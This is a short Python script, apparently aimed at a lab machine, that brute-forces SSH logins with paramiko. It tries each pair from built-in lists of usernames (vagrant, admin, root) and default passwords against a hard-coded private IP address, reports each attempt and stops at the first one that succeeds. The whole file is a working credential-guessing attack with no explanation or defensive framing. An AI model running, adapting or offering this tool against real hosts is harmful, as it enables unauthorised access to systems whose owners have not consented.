import paramiko
import socket

def ssh_brute_force(host, port, usernames, passwords, timeout=3):
    for username in usernames:
        for password in passwords:
            try:
                print(f"[ ] Trying {username}:{password}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname=host, port=port, username=username, password=password, timeout=timeout)
                print(f"[+] SUCCESS: {username}:{password}")
                client.close()
                return 
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {username}:{password}")
            except (socket.error, paramiko.SSHException) as e:
                print(f"[!] Connection error for {username}:{password} — {str(e)}")
                continue

if __name__ == "__main__":
    target_ip = "192.168.0.182"
    target_port = 22

    usernames = ["vagrant", "admin", "root"]
    passwords = [ "admin123", "password", "toor","vagrant"]

    ssh_brute_force(target_ip, target_port, usernames, passwords)
